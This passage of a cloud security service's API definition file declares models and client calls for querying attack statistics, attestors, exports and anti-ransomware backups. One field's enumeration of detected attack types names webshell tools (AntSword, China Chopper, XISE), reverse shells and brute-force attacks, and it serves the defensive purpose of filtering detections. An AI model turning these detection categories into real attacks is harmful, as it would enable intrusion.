model DescribeAssetsSecurityEventSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAssetsSecurityEventSummaryResponseBody(name='body'),
}

/**
 * @summary Queries the risk information about containers.
 *
 * @param request DescribeAssetsSecurityEventSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAssetsSecurityEventSummaryResponse
 */
async function describeAssetsSecurityEventSummaryWithOptions(request: DescribeAssetsSecurityEventSummaryRequest, runtime: Util.RuntimeOptions): DescribeAssetsSecurityEventSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetsSecurityEventSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the risk information about containers.
 *
 * @param request DescribeAssetsSecurityEventSummaryRequest
 * @return DescribeAssetsSecurityEventSummaryResponse
 */
async function describeAssetsSecurityEventSummary(request: DescribeAssetsSecurityEventSummaryRequest): DescribeAssetsSecurityEventSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetsSecurityEventSummaryWithOptions(request, runtime);
}

model DescribeAttackAnalysisDataRequest {
  base64?: string(name='Base64', description='Specifies whether to encode the value of the **client_url** field in the query results by using the Base64 algorithm. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**.

>  If the Type parameter is set to **DETAILS**, you must specify the CurrentPage parameter.', example='1'),
  data?: string(name='Data', description='The condition that is used to filter attack events.

>  The following list describes the valid values of crack_type:

*   3: brute-force attack on MySQL

*   4: FTP brute-force attack

*   5: SSH brute-force attack

*   6: RDP brute-force attack

*   9: brute-force attack on Microsoft SQL Server

*   101: intercepted attack on Java Struts 2

*   102: intercepted attack on Redis

*   103: communication with AntSword Webshell

*   104: communication with China Chopper Webshell

*   133: communication with XISE Webshell

*   sqli: SQL injection

*   codei: code execution

*   xss: cross-site scripting (XSS)

*   lfi: local file inclusion

*   rfi: remote file inclusion

*   webshell: trojan script

*   upload: vulnerability upload

*   path: directory traversal

*   bypass: unauthorized access

*   csrf: cross-site request forgery (CSRF)

*   crlf: carriage return line feed (CRLF)

*   other: others', example='{"crack_type":"9"}'),
  endTime?: long(name='EndTime', description='The timestamp when the attack stops. Unit: seconds.

This parameter is required.', example='1649040221'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

>  If the Type parameter is set to **DETAILS**, you must specify the PageSize parameter.', example='10'),
  startTime?: long(name='StartTime', description='The timestamp at which the attack starts. By default, the statistics of the previous seven days are queried. Unit: seconds.

>  The start time that you specify must be within the previous 40 days.

This parameter is required.', example='1644027670'),
  type?: string(name='Type', description='The details of attack analysis. Valid values:

*   **TOTAL**: number of attacks
*   **TREND**: attack trend
*   **PIE_CHART**: distribution of attacks by type
*   **SOURCE_TOP**: top 5 attack sources
*   **CLIENT_TOP**: top 5 attacked assets
*   **DETAILS**: attack details

>  If the Type parameter is set to **DETAILS**, you must specify the CurrentPage and PageSize parameters.

This parameter is required.', example='DETAILS'),
}

model DescribeAttackAnalysisDataResponseBody = {
  data?: string(name='Data', description='The attack events. The value contains the following fields:

*   **client_url**: the URL of the attack request.

*   **internetIp**: the IP address of the asset.

*   **instanceName**: the name of the asset.

*   **table_src**: the source of data.

*   **uuid**: the UUID of the asset.

*   **crack_method**: the method of the attack request.

*   **crack_hour**: the attack time.

*   **crack_src_ip**: the IP address from which the attack is launched.

*   **instanceId**: the ID of the asset.

*   **dst_port**: the attacked port.

*   **client_ip**: the attacked IP address.

*   **location**: the region from which the attack is launched.

*   **aliuid**: the ID of the Alibaba Cloud account.

*   **crack_cnt**: the number of times that the attack is launched.

*   **crack_type**: the type of the attack. Valid values:

    *   **113**: improper authorization
    *   **112**: redirection attack
    *   **upload**: vulnerability upload
    *   **other**: others
    *   **webshell**: trojan script
    *   **201**: suspicious connection
    *   **9**: brute-force attack on Microsoft SQL Server
    *   **5**: SSH brute-force attack
    *   **6**: RDP brute-force attack
    *   **lfi**: local file inclusion
    *   **7**: code execution
    *   **sqli**: SQL injection
    *   **209**: web attack
    *   **31**: buffer overflow
    *   **3**: brute-force attack on MySQL
    *   **30**: clickjacking
    *   **4**: FTP brute-force attack
    *   **bypass**: unauthorized access
    *   **33**: format string
    *   **deeplearning**: others
    *   **32**: integer overflow
    *   **203**: brute-force attack
    *   **34**: race condition
    *   **rfi**: remote file inclusion
    *   **0**: SQL injection
    *   **212**: mining behavior
    *   **213**: reverse shell
    *   **211**: worm
    *   **61**: session timeout
    *   **20**: directory traversal
    *   **xss**: XSS
    *   **22**: unauthorized access
    *   **21**: scan attack
    *   **24**: file modification
    *   **26**: file deletion
    *   **25**: file reading
    *   **28**: CRLF injection
    *   **27**: logic error
    *   **29**: template injection
    *   **csrf**: CSRF
    *   **path**: directory traversal
    *   **crlf**: CRLF
    *   **102**: CSRF
    *   **103**: server-side request forgery (SSRF)
    *   **101**: XSS
    *   **11**: file inclusion
    *   **10**: file upload
    *   **12**: vulnerability upload
    *   **15**: unauthorized access
    *   **14**: information leakage
    *   **17**: XML entity injection
    *   **16**: insecure configuration
    *   **19**: Lightweight Directory Access Protocol (LDAP) injection
    *   **18**: XPath injection
    *   **codei**: code execution', example='[{\\\\"crack_hour\\\\":1662480000000,\\\\"crack_cnt\\\\":471},{\\\\"crack_hour\\\\":1662483600000,\\\\"crack_cnt\\\\":461},{\\\\"crack_hour\\\\":1662487200000,\\\\"crack_cnt\\\\":445},{\\\\"crack_hour\\\\":1662490800000,\\\\"crack_cnt\\\\":471},{\\\\"crack_hour\\\\":1662494400000,\\\\"crack_cnt\\\\":534},{\\\\"crack_hour\\\\":1662498000000,\\\\"crack_cnt\\\\":652},{\\\\"crack_hour\\\\":1662501600000,\\\\"crack_cnt\\\\":706},{\\\\"crack_hour\\\\":1662505200000,\\\\"crack_cnt\\\\":613},{\\\\"crack_hour\\\\":1662508800000,\\\\"crack_cnt\\\\":578},{\\\\"crack_hour\\\\":1662512400000,\\\\"crack_cnt\\\\":577},{\\\\"crack_hour\\\\":1662516000000,\\\\"crack_cnt\\\\":616},{\\\\"crack_hour\\\\":1662519600000,\\\\"crack_cnt\\\\":597},{\\\\"crack_hour\\\\":1662523200000,\\\\"crack_cnt\\\\":575},{\\\\"crack_hour\\\\":1662526800000,\\\\"crack_cnt\\\\":507}]'),
  page?: int32(name='Page', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 10.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4C1AE3F3-18FA-4108-BBB9-AFA1A032756C'),
  total?: int32(name='Total', description='The total number of attack events returned.', example='1000'),
}

model DescribeAttackAnalysisDataResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAttackAnalysisDataResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of attack analysis.
 *
 * @param request DescribeAttackAnalysisDataRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAttackAnalysisDataResponse
 */
async function describeAttackAnalysisDataWithOptions(request: DescribeAttackAnalysisDataRequest, runtime: Util.RuntimeOptions): DescribeAttackAnalysisDataResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.base64)) {
    query['Base64'] = request.base64;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.data)) {
    query['Data'] = request.data;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAttackAnalysisData',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of attack analysis.
 *
 * @param request DescribeAttackAnalysisDataRequest
 * @return DescribeAttackAnalysisDataResponse
 */
async function describeAttackAnalysisData(request: DescribeAttackAnalysisDataRequest): DescribeAttackAnalysisDataResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAttackAnalysisDataWithOptions(request, runtime);
}

model DescribeAttestorsRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  name?: string(name='Name', description='The name of the witness.', example='attestor-auto-ad5316'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='222.35.XXX.XXX'),
}

model DescribeAttestorsResponseBody = {
  attestors?: [ 
    {
      keyId?: string(name='KeyId', description='The ID of the KMS key.', example='2e81355b-f8e7-4090-8082-a8f8124a****'),
      keyRegionId?: string(name='KeyRegionId', description='The region ID of the KMS key.', example='cn-hangzhou'),
      keyVersionId?: string(name='KeyVersionId', description='The version ID of the Key Management Service (KMS) key.', example='8d7c9c91-57ce-4cf4-a959-1e700e13****'),
      name?: string(name='Name', description='The name of the witness.', example='attestor-123'),
      remark?: string(name='Remark', description='The description.', example='attestor'),
    }
  ](name='Attestors', description='The witnesses.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='122'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model DescribeAttestorsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAttestorsResponseBody(name='body'),
}

/**
 * @summary Queries a list of witnesses.
 *
 * @param request DescribeAttestorsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAttestorsResponse
 */
async function describeAttestorsWithOptions(request: DescribeAttestorsRequest, runtime: Util.RuntimeOptions): DescribeAttestorsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAttestors',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of witnesses.
 *
 * @param request DescribeAttestorsRequest
 * @return DescribeAttestorsResponse
 */
async function describeAttestors(request: DescribeAttestorsRequest): DescribeAttestorsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAttestorsWithOptions(request, runtime);
}

model DescribeAutoDelConfigResponseBody = {
  days?: int32(name='Days', description='The number of days during which a detected vulnerability is retained before the vulnerability is automatically deleted.', example='30'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C56F66FD-C4EE-4813-ABDC-4FF94B6C384E'),
}

model DescribeAutoDelConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAutoDelConfigResponseBody(name='body'),
}

/**
 * @summary Queries the number of days during which a detected vulnerability is retained before the vulnerability is automatically deleted.
 *
 * @param request DescribeAutoDelConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAutoDelConfigResponse
 */
async function describeAutoDelConfigWithOptions(runtime: Util.RuntimeOptions): DescribeAutoDelConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAutoDelConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of days during which a detected vulnerability is retained before the vulnerability is automatically deleted.
 *
 * @return DescribeAutoDelConfigResponse
 */
async function describeAutoDelConfig(): DescribeAutoDelConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAutoDelConfigWithOptions(runtime);
}

model DescribeBackUpExportInfoRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  exportType?: string(name='ExportType', description='The type of archived information. Valid values:

*   **suspiciousExport**: alert event

This parameter is required.', example='suspiciousExport'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20.', example='20'),
}

model DescribeBackUpExportInfoResponseBody = {
  data?: [ 
    {
      currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='29'),
      fileName?: string(name='FileName', description='The name of the file.', example='suspicious_event_20221203'),
      gmtCreate?: long(name='GmtCreate', description='The time when the export task was created.', example='1671607025000'),
      id?: long(name='Id', description='The ID of the export task.', example='273698***'),
      link?: string(name='Link', description='The URL at which you can download the archived information.', example='http://xxx.oss-cn-xxx.aliyuncs.com/export/assetInstance_20221221_1671606250570.zip'),
      message?: string(name='Message', description='The error message that is returned when the export task fails.', example='success'),
      progress?: int32(name='Progress', description='The progress percentage of the export task.', example='100'),
      status?: string(name='Status', description='The status of the export task. Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='success'),
      totalCount?: int32(name='TotalCount', description='The total number of entries in the file.', example='29'),
    }
  ](name='Data', description='The data returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='29'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeBackUpExportInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeBackUpExportInfoResponseBody(name='body'),
}

/**
 * @summary Queries the information about a file to which archived alert events are exported.
 *
 * @param request DescribeBackUpExportInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeBackUpExportInfoResponse
 */
async function describeBackUpExportInfoWithOptions(request: DescribeBackUpExportInfoRequest, runtime: Util.RuntimeOptions): DescribeBackUpExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackUpExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about a file to which archived alert events are exported.
 *
 * @param request DescribeBackUpExportInfoRequest
 * @return DescribeBackUpExportInfoResponse
 */
async function describeBackUpExportInfo(request: DescribeBackUpExportInfoRequest): DescribeBackUpExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackUpExportInfoWithOptions(request, runtime);
}

model DescribeBackupClientsRequest {
  supportRegionId?: string(name='SupportRegionId', description='The region in which the anti-ransomware feature is supported.
> You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the regions in which the anti-ransomware feature is supported.

This parameter is required.', example='cn-hangzhou'),
}

model DescribeBackupClientsResponseBody = {
  clients?: [ 
    {
      clientId?: string(name='ClientId', description='The ID of the anti-ransomware agent.', example='c-000az2f537r73dyh****'),
      clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent.

Valid values:

*   **INSTALLING**: The agent is being installed.
*   **ONLINE**: The agent is online.
*   **UNINSTALLING**: The agent is being uninstalled.
*   **NOT_INSTALLED**: The agent is not installed.
*   **ACTIVATED**: The agent is enabled.
*   **CLIENT_CONNECTION_ERROR**: A connection error occurs on the agent.', example='ONLINE'),
      clientVersion?: string(name='ClientVersion', description='The version of the anti-ransomware agent.', example='2.0.0'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance on which the anti-ransomware agent is installed.', example='i-bp15hyph4aci99dv****'),
      uuid?: string(name='Uuid', description='The UUID of the Elastic Compute Service (ECS) instance on which the anti-ransomware agent is installed.', example='22f6550d-f294-449b-b6e6-90638fd1****'),
    }
  ](name='Clients', description='An array that consists of the information about the anti-ransomware agent.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E3ED094C-9EB7-4239-962B-D0FB3D5F23C7'),
}

model DescribeBackupClientsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeBackupClientsResponseBody(name='body'),
}

/**
 * @summary Queries the servers on which the anti-ransomware agent is installed in a specified region.
 *
 * @description You can call the DescribeBackupClients operation to query the servers on which the anti-ransomware agent is installed in a specified region.
 *
 * @param request DescribeBackupClientsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeBackupClientsResponse
 */
async function describeBackupClientsWithOptions(request: DescribeBackupClientsRequest, runtime: Util.RuntimeOptions): DescribeBackupClientsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.supportRegionId)) {
    query['SupportRegionId'] = request.supportRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupClients',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the servers on which the anti-ransomware agent is installed in a specified region.
 *
 * @description You can call the DescribeBackupClients operation to query the servers on which the anti-ransomware agent is installed in a specified region.
 *
 * @param request DescribeBackupClientsRequest
 * @return DescribeBackupClientsResponse
 */
async function describeBackupClients(request: DescribeBackupClientsRequest): DescribeBackupClientsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupClientsWithOptions(request, runtime);
}

model DescribeBackupFilesRequest {
  currentPage?: string(name='CurrentPage', description='The number of the page to return. Default value: **1**.

This parameter is required.', example='1'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **10**.

This parameter is required.', example='10'),
  path?: string(name='Path', description='The path to the backup file.', example='“”'),
  snapshotHash?: string(name='SnapshotHash', description='The hash value of the backup file.

This parameter is required.', example='a7f26223ef3974c6fac324cd37713ab65ab618859d20b4039192a5da44d77b63'),
  uuid?: string(name='Uuid', description='The UUID of the server to which an anti-ransomware policy is applied.

This parameter is required.', example='6d5b361f-958d-48a8-a9d2-d6e82c1a****'),
}

model DescribeBackupFilesResponseBody = {
  backupFiles?: [ 
    {
      name?: string(name='Name', description='The name of the anti-ransomware policy.', example='Group 1'),
      size?: long(name='Size', description='The size of the backup file. Unit: bytes.', example='100'),
      subtree?: string(name='Subtree', description='The path to the subdirectory of the backup file.', example='Python27\\\\'),
      type?: string(name='Type', description='The type of the protected file. Valid values:

*   **file**: files
*   **dir**: folders', example='dir'),
    }
  ](name='BackupFiles', description='An array that consists of the backup files returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of backup files returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of backup files returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='00A60A6D-33E0-5D5A-9B7C-E5D4DCA88148'),
}

model DescribeBackupFilesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeBackupFilesResponseBody(name='body'),
}

/**
 * @summary Queries backup files.
 *
 * @param request DescribeBackupFilesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeBackupFilesResponse
 */
async function describeBackupFilesWithOptions(request: DescribeBackupFilesRequest, runtime: Util.RuntimeOptions): DescribeBackupFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.path)) {
    query['Path'] = request.path;
  }
  if (!Util.isUnset(request.snapshotHash)) {
    query['SnapshotHash'] = request.snapshotHash;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries backup files.
 *
 * @param request DescribeBackupFilesRequest
 * @return DescribeBackupFilesResponse
 */
async function describeBackupFiles(request: DescribeBackupFilesRequest): DescribeBackupFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupFilesWithOptions(request, runtime);
}

model DescribeBackupMachineStatusRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.

This parameter is required.', example='123'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeBackupPolicy](~~DescribeBackupPolicy~~) operation to query the UUIDs of servers.

This parameter is required.', example='eb2c782e-64f2-4590-a86c-d90164df****'),
}

model DescribeBackupMachineStatusResponseBody = {
  backupMachineStatus?: {
    clientId?: string(name='ClientId', description='The ID of the anti-ransomware agent.', example='c-000dbefaw9f7gnbw****'),
    clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent. Valid values:

*   **ONLINE**: normal
*   **CLIENT_CONNECTION_ERROR**: abnormal
*   **UNINSTALLING**: being uninstalled
*   **UNINSTALL_FAILED**: failed to be uninstalled
*   **UPGRADING**: being upgraded
*   **UPGRADE_FAILED**: failed to be upgraded', example='ONLINE'),
    clientVersion?: string(name='ClientVersion', description='The version of the anti-ransomware agent.', example='2.11.0'),
    errorCode?: string(name='ErrorCode', description='The error code returned.', example='CLIENT_CONNECTION_ERROR'),
    errorList?: [ 
      {
        errorCode?: string(name='ErrorCode', description='The error code.', example='TARGET_NOT_EXIST'),
        errorStatus?: string(name='ErrorStatus', description='The error message.', example='FAILED'),
      }
    ](name='ErrorList', description='An array that consists of the error information reported by the backup server.'),
    instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-2zeaqkb80vloxjcj****'),
    regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-shenzhen'),
    savedBackupCount?: int32(name='SavedBackupCount', description='The number of backup versions.', example='7'),
    serviceStatus?: string(name='ServiceStatus', description='The status of the anti-ransomware service. Valid values:
*   **SERVICE_EXCEPTION**: Service exception
*   **RESTORING**: Restoring
*   **BACKING_UP**: Backup in process', example='RESTORING'),
    status?: string(name='Status', description='The status of the anti-ransomware agent. Valid values:

*   **NOT_INSTALLED**: not installed
*   **CLIENT_CONNECTION_ERROR**: abnormal
*   **ACTIVATED**: normal', example='ACTIVATED'),
    uuid?: string(name='Uuid', description='The UUID of the server.', example='eb2c782e-64f2-4590-a86c-d90164df****'),
    vaultId?: string(name='VaultId', description='The ID of the backup vault in which the backup data is stored.', example='v-0005i2qh5fcr6seo****'),
  }(name='BackupMachineStatus', description='The backup status of the server.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model DescribeBackupMachineStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeBackupMachineStatusResponseBody(name='body'),
}

/**
 * @summary Queries the backup status of a sever to which an anti-ransomware policy is applied.
 *
 * @param request DescribeBackupMachineStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeBackupMachineStatusResponse
 */
async function describeBackupMachineStatusWithOptions(request: DescribeBackupMachineStatusRequest, runtime: Util.RuntimeOptions): DescribeBackupMachineStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupMachineStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the backup status of a sever to which an anti-ransomware policy is applied.
 *
 * @param request DescribeBackupMachineStatusRequest
 * @return DescribeBackupMachineStatusResponse
 */
async function describeBackupMachineStatus(request: DescribeBackupMachineStatusRequest): DescribeBackupMachineStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupMachineStatusWithOptions(request, runtime);
}

model DescribeBackupPoliciesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.

This parameter is required.', example='1'),
  machineRemark?: string(name='MachineRemark', description='The information that you want to use to identify the servers protected by the anti-ransomware policy. You can enter the IP address or ID of a server.', example='1.1.XX.XX'),
  name?: string(name='Name', description='The name of the anti-ransomware policy that you want to query.', example='SecurityStrategy-20200303'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 10.

This parameter is required.', example='10'),
  status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='enabled'),
}

model DescribeBackupPoliciesResponseBody = {
  pageInfo?: {
